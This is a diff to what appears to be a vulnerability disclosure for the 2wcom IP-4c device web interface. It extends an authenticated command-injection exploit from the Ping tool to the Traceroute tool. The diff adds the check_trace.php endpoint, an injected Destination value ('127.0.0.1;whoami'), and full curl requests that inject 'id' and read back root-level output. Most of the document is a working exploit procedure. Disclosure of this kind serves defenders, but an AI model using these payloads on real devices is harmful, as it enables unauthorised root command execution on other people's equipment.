@@ -1,7 +1,7 @@
 # 2wcom IP-4c - Remote Code Execution (RCE)
 
 ## Description
-The 2wcom IP-4c web interface allows an authenticated attacker to perform Remote Code Execution via command injection in the ping tool configuration. This is due to improper input sanitization in the `Destination` field, which is executed directly in the system shell.
+The 2wcom IP-4c web interface allows an authenticated attacker to perform Remote Code Execution via command injection in the ping , Traceroute tool configuration. This is due to improper input sanitization in the `Destination` field, which is executed directly in the system shell.
 
 ---
 
@@ -48,7 +48,8 @@ The 2wcom IP-4c web interface allows an authenticated attacker to perform Remote
 ## Vulnerable Endpoints
 - `/cwi/ajax_request/get_data.php?store=1`
 - `/cwi/ajax_request/check_ping.php`
-- `/#tcpip` (via web interface’s Tools > Ping)
+- `/cwi/ajax_request/check_trace.php`
+- `/#tcpip` (via web interface’s Tools > Ping,Traceroute)
 
 ---
 
@@ -59,7 +60,10 @@ The 2wcom IP-4c web interface allows an authenticated attacker to perform Remote
 2. Go to: `/#tcpip`  
    → Tools  
    → Ping
-3. Set `Destination` to:
+   or
+   → Traceroute
+
+4. Set `Destination` to:
 ```bash
 127.0.0.1;whoami
 ```
@@ -77,6 +81,23 @@ curl 'http://<target>/cwi/ajax_request/get_data.php?store=1' \
 2. Check the result with:
 ```bash 
 curl 'http://<target>/cwi/ajax_request/check_ping.php' -X POST -H 'Cookie: PHPSESSID=<session>; other-cookies...' -H 'Content-Length: 0'
+```
+The response will contain command output:
+```bash
+uid=0(root) gid=0(root)
+```
+---
+or 
+1. Send the command injection using:
+```bash
+curl 'http://<target>/cwi/ajax_request/get_data.php?store=1' \
+  -X POST \
+  -H 'Cookie: PHPSESSID=<session>; other-cookies...' \
+  --data-raw 'CSRFName=CSRFGuard_684381398&CSRFToken=b607cd9e764eaf8507ce6d88eb009429&set%3Acsl-interface-tools-traceroute-destination=127.0.0.1%3Bid&set%3Acsl-interface-tools-traceroute-ifIndex=0&set%3Acsl-interface-tools-traceroute-ifIndexVlan=0&set%3Acsl-interface-tools-traceroute-maxHops=1&set%3Acsl-interface-tools-traceroute-timeToWait=3'
+```
+2. Check the result with:
+```bash 
+curl 'http://<target>/cwi/ajax_request/check_trace.php' -X POST -H 'Cookie: PHPSESSID=<session>; other-cookies...' -H 'Content-Length: 0'
 ```
 The response will contain command output:
 ```bash
